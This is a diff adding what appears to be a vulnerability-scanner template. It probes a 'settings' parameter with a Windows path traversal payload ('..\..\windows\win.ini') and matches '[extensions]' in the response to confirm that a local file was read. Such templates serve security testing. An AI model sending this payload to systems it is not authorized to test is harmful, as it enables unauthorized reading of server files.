@@ -1,0 +1,20 @@
+id: lfi6-0174
+name: 'Traversal in settings'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via settings'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      settings:
+        - '..\..\windows\win.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[extensions]'
